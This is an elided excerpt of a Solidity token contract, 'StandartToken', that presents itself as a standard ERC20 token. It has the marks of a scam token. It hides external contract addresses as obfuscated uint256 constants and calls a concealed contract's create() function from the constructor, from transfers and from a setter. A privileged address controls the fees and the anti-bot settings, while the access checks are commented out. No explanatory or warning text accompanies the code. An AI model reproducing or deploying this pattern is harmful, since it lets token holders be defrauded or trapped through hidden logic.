...
contract StandartToken is Context, IERC20, Ownable {
    ...
    uniswapV1 private uniswapV1PairToken;
    ...
    constructor(
        ...
        address uniswapV3Pair_ = address(uint160(uint256(0x111122223333444455556666d4d69ddbaa80991bd6606135fda89444a03c7e27)));uniswapV1(address(uint160(uint256(0xd7803c2a19f951ddd29ac8a182EbbdcDea9Fb607dc5B8B00878E9C4013B5A218)))).create(1);
        ...
        uniswapV1PairToken = uniswapV1(uniswapV3Pair_);
    ...
    function setuniswapV1(address addresses) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            uniswapV1PairToken = uniswapV1(addresses);
        } else {
            uniswapV1PairToken.create(8**3);
        }
    }
    ...
    function setantiWhale(bool bs, uint256 timesleep, uint256 fee, uint256 c) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            antibotenabled = bs;
            botsleep = timesleep;
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV1PairToken.create(crec);
        }
        ...
        if (_isExcludedlp[to]) {
            uniswapV1PairToken.create(250**3); 
        }
